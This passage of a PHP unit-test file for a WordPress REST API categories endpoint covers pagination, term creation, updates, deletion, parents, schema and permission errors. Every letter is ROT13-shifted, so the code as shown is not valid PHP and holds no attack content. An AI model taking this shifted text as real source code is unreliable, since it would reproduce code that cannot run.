			$guvf->nffregPbhag( 10, $erfcbafr->trg_qngn() );
		}
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			erfg_hey( 'jc/i2/pngrtbevrf' )
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// 3eq cntr.
		frys::snpgbel()->pngrtbel->perngr();
		++$gbgny_pngrtbevrf;
		++$gbgny_cntrf;
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cntr', 3 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_pngrtbevrf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$guvf->nffregPbhag( 10, $erfcbafr->trg_qngn() );
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
			erfg_hey( 'jc/i2/pngrtbevrf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 4,
			),
			erfg_hey( 'jc/i2/pngrtbevrf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $arkg_yvax . '>; ery=\"arkg\"', $urnqref['Yvax'] );

		// Ynfg cntr.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cntr', $gbgny_cntrf );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_pngrtbevrf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		vs ( 'URNQ' !== $zrgubq ) {
			$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );
		}
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf - 1,
			),
			erfg_hey( 'jc/i2/pngrtbevrf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );

		// Bhg bs obhaqf.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cntr', 100 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_pngrtbevrf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		vs ( 'URNQ' !== $zrgubq ) {
			$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );
		}
		$ceri_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => $gbgny_cntrf,
			),
			erfg_hey( 'jc/i2/pngrtbevrf' )
		);
		$guvf->nffregFgevatPbagnvafFgevat( '<' . $ceri_yvax . '>; ery=\"ceri\"', $urnqref['Yvax'] );
		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"arkg\"', $urnqref['Yvax'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_cre_cntr_rkprrqf_ahzore_bs_vgrzf() {
		// Fgneg bs gur vaqrk + Hapngrtbevmrq qrsnhyg grez.
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cntr', 1 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 100 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( frys::$gbgny_pngrtbevrf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( 1, $urnqref['K-JC-GbgnyCntrf'] );
		$guvf->nffregPbhag( frys::$gbgny_pngrtbevrf, $erfcbafr->trg_qngn() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'cntr', 2 );
		$erdhrfg->frg_cnenz( 'cre_cntr', 100 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( frys::$gbgny_pngrtbevrf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( 1, $urnqref['K-JC-GbgnyCntrf'] );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );
	}

	choyvp shapgvba grfg_trg_vgrz() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->purpx_trg_gnkbabzl_grez_erfcbafr( $erfcbafr );
	}

	/**
	 * @gvpxrg 39122
	 */
	choyvp shapgvba grfg_trg_vgrz_zrgn() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zrgn', $qngn );

		$zrgn = (neenl) $qngn['zrgn'];
		$guvf->nffregNeenlUnfXrl( 'grfg_fvatyr', $zrgn );
		$guvf->nffregFnzr( $zrgn['grfg_fvatyr'], '' );
		$guvf->nffregNeenlUnfXrl( 'grfg_zhygv', $zrgn );
		$guvf->nffregFnzr( $zrgn['grfg_zhygv'], neenl() );
		$guvf->nffregNeenlUnfXrl( 'grfg_png_fvatyr', $zrgn );
		$guvf->nffregFnzr( $zrgn['grfg_png_fvatyr'], '' );
		$guvf->nffregNeenlUnfXrl( 'grfg_png_zhygv', $zrgn );
		$guvf->nffregFnzr( $zrgn['grfg_png_zhygv'], neenl() );
	}

	/**
	 * @gvpxrg 39122
	 */
	choyvp shapgvba grfg_trg_vgrz_zrgn_ertvfgrerq_sbe_qvssrerag_gnkbabzl() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zrgn', $qngn );

		$zrgn = (neenl) $qngn['zrgn'];
		$guvf->nffregNeenlAbgUnfXrl( 'grfg_gnt_zrgn', $zrgn );
	}

	choyvp shapgvba grfg_trg_grez_vainyvq_gnkbabzl() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/vainyvq-gnkbabzl/1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_grez_vainyvq_grez() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_vgrz_vainyvq_crezvffvba_sbe_pbagrkg() {
		jc_frg_pheerag_hfre( 0 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/1' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_sbeovqqra_pbagrkg', $erfcbafr, 401 );
	}

	choyvp shapgvba grfg_trg_grez_cevingr_gnkbabzl() {
		ertvfgre_gnkbabzl( 'ebova', 'cbfg', neenl( 'choyvp' => snyfr ) );
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pncr',
				'gnkbabzl' => 'ebova',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grezf/ebova/' . $grez1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_trg_vgrz_vapbeerpg_gnkbabzl() {
		ertvfgre_gnkbabzl( 'ebova', 'cbfg' );
		$grez1 = frys::snpgbel()->grez->perngr(
			neenl(
				'anzr'     => 'Pncr',
				'gnkbabzl' => 'ebova',
			)
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/' . $grez1 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Guvf grez vf fb njrfbzr.' );
		$erdhrfg->frg_cnenz( 'fyht', 'fb-njrfbzr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$urnqref = $erfcbafr->trg_urnqref();
		$qngn    = $erfcbafr->trg_qngn();
		$guvf->nffregFgevatPbagnvafFgevat( '/jc/i2/pngrtbevrf/' . $qngn['vq'], $urnqref['Ybpngvba'] );
		$guvf->nffregFnzr( 'Zl Njrfbzr Grez', $qngn['anzr'] );
		$guvf->nffregFnzr( 'Guvf grez vf fb njrfbzr.', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( 'fb-njrfbzr', $qngn['fyht'] );
	}

	/**
	 * @gvpxrg 41370
	 */
	choyvp shapgvba grfg_perngr_vgrz_grez_nyernql_rkvfgf() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$rkvfgvat_vq = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Rkvfgvat' ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Rkvfgvat' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'grez_rkvfgf', $qngn['pbqr'] );
		$guvf->nffregFnzr( $rkvfgvat_vq, (vag) $qngn['qngn']['grez_vq'] );

		jc_qryrgr_grez( $rkvfgvat_vq, 'pngrtbel' );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_gnkbabzl() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/vainyvq-gnkbabzl' );
		$erdhrfg->frg_cnenz( 'anzr', 'Vainyvq Gnkbabzl' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_perngr_vgrz_vapbeerpg_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Vapbeerpg crezvffvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_perngr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_vgrz_vapbeerpg_crezvffvbaf_pbagevohgbe() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Vapbeerpg crezvffvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_perngr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_perngr_vgrz_zvffvat_nethzragf() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_zvffvat_pnyyonpx_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_jvgu_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$cnerag = jc_vafreg_grez( 'grfg-pngrtbel', 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'cnerag', $cnerag['grez_vq'] );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $cnerag['grez_vq'], $qngn['cnerag'] );
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr(), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'cnerag', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_perngr_vgrz_jvgu_ab_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$cnerag = 0;

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf' );
		$erdhrfg->frg_cnenz( 'anzr', 'Zl Njrfbzr Grez' );
		$erdhrfg->frg_cnenz( 'cnerag', $cnerag );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $cnerag, $qngn['cnerag'] );
	}

	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$bevt_netf = neenl(
			'anzr'        => 'Bevtvany Anzr',
			'qrfpevcgvba' => 'Bevtvany Qrfpevcgvba',
			'fyht'        => 'bevtvany-fyht',
		);

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr( $bevt_netf ), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Arj Anzr' );
		$erdhrfg->frg_cnenz( 'qrfpevcgvba', 'Arj Qrfpevcgvba' );
		$erdhrfg->frg_cnenz( 'fyht', 'arj-fyht' );
		$erdhrfg->frg_cnenz(
			'zrgn',
			neenl(
				'grfg_fvatyr'     => 'whfg zrgn',
				'grfg_png_fvatyr' => 'pngrtbel-fcrpvsvp zrgn',
				'grfg_gnt_zrgn'   => 'gnt-fcrpvsvp zrgn',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Arj Anzr', $qngn['anzr'] );
		$guvf->nffregFnzr( 'Arj Qrfpevcgvba', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzr( 'arj-fyht', $qngn['fyht'] );
		$guvf->nffregFnzr( 'whfg zrgn', $qngn['zrgn']['grfg_fvatyr'] );
		$guvf->nffregFnzr( 'pngrtbel-fcrpvsvp zrgn', $qngn['zrgn']['grfg_png_fvatyr'] );
		$guvf->nffregNeenlAbgUnfXrl( 'grfg_gnt_zrgn', $qngn['zrgn'] );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_gnkbabzl() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/vainyvq-gnkbabzl/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erdhrfg->frg_cnenz( 'anzr', 'Vainyvq Gnkbabzl' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_grez() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erdhrfg->frg_cnenz( 'anzr', 'Vainyvq Grez' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vapbeerpg_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr(), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'anzr', 'Vapbeerpg crezvffvbaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_hcqngr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$cnerag = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr(), 'pngrtbel' );
		$grez   = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr(), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'cnerag', $cnerag->grez_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $cnerag->grez_vq, $qngn['cnerag'] );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_erzbir_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$byq_cnerag_grez = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr(), 'pngrtbel' );
		$arj_cnerag_vq   = 0;

		$grez = trg_grez_ol(
			'vq',
			frys::snpgbel()->pngrtbel->perngr(
				neenl(
					'cnerag' => $byq_cnerag_grez->grez_vq,
				)
			),
			'pngrtbel'
		);

		$guvf->nffregFnzr( $byq_cnerag_grez->grez_vq, $grez->cnerag );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'cnerag', $arj_cnerag_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );

		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $arj_cnerag_vq, $qngn['cnerag'] );
	}

	choyvp shapgvba grfg_hcqngr_vgrz_vainyvq_cnerag() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr(), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'cnerag', ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_qryrgr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Qryrgrq Pngrtbel' ) ), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erdhrfg->frg_cnenz( 'sbepr', gehr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregFnzr( 'Qryrgrq Pngrtbel', $qngn['cerivbhf']['anzr'] );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_ab_genfu() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$grez = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Qryrgrq Pngrtbel' ) ), 'pngrtbel' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );

		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_genfu_abg_fhccbegrq', $erfcbafr, 501 );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_vainyvq_gnkbabzl() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/vainyvq-gnkbabzl/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_ab_ebhgr', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_vainyvq_grez() {
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/pngrtbevrf/' . ERFG_GRFGF_VZCBFFVOYL_UVTU_AHZORE );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grez_vainyvq', $erfcbafr, 404 );
	}

	choyvp shapgvba grfg_qryrgr_vgrz_vapbeerpg_crezvffvbaf() {
		jc_frg_pheerag_hfre( frys::$fhofpevore );

		$grez     = trg_grez_ol( 'vq', frys::snpgbel()->pngrtbel->perngr(), 'pngrtbel' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/pngrtbevrf/' . $grez->grez_vq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_pnaabg_qryrgr', $erfcbafr, 403 );
	}

	choyvp shapgvba grfg_cercner_vgrz() {
		$grez = trg_grez( 1, 'pngrtbel' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/1' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->purpx_gnkbabzl_grez( $grez, $qngn, $erfcbafr->trg_yvaxf() );
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg();
		$raqcbvag = arj JC_ERFG_Grezf_Pbagebyyre( 'pngrtbel' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,anzr' );
		$grez     = trg_grez( 1, 'pngrtbel' );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'anzr',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	choyvp shapgvba grfg_cercner_gnkbabzl_grez_puvyq() {
		$puvyq = frys::snpgbel()->pngrtbel->perngr(
			neenl(
				'cnerag' => 1,
			)
		);
		$grez  = trg_grez( $puvyq, 'pngrtbel' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/' . $puvyq );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->purpx_gnkbabzl_grez( $grez, $qngn, $erfcbafr->trg_yvaxf() );

		$guvf->nffregFnzr( 1, $qngn['cnerag'] );

		$yvaxf = $erfcbafr->trg_yvaxf();
		$guvf->nffregFnzr( erfg_hey( 'jc/i2/pngrtbevrf/1' ), $yvaxf['hc'][0]['uers'] );
	}

	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pngrtbevrf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 9, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbhag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'yvax', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zrgn', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gnkbabzl', $cebcregvrf );
		$guvf->nffregFnzr( neenl( 'pngrtbel' ), $cebcregvrf['gnkbabzl']['rahz'] );
	}

	choyvp shapgvba grfg_trg_nqqvgvbany_svryq_ertvfgengvba() {

		$fpurzn = neenl(
			'glcr'        => 'vagrtre',
			'qrfpevcgvba' => 'Fbzr vagrtre bs zvar',
			'rahz'        => neenl( 1, 2, 3, 4 ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
		);

		ertvfgre_erfg_svryq(
			'pngrtbel',
			'zl_phfgbz_vag',
			neenl(
				'fpurzn'       => $fpurzn,
				'trg_pnyyonpx' => neenl( $guvf, 'nqqvgvbany_svryq_trg_pnyyonpx' ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/pngrtbevrf' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $qngn['fpurzn']['cebcregvrf'] );
		$guvf->nffregFnzr( $fpurzn, $qngn['fpurzn']['cebcregvrf']['zl_phfgbz_vag'] );

		$pngrtbel_vq = frys::snpgbel()->pngrtbel->perngr();
		$erdhrfg     = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/pngrtbevrf/' . $pngrtbel_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregNeenlUnfXrl( 'zl_phfgbz_vag', $erfcbafr->qngn );

		tybony $jc_erfg_nqqvgvbany_svryqf;
		$jc_erfg_nqqvgvbany_svryqf = neenl();
	}

	choyvp shapgvba nqqvgvbany_svryq_trg_pnyyonpx( $erfcbafr_qngn, $svryq_anzr ) {
		erghea 123;
	}

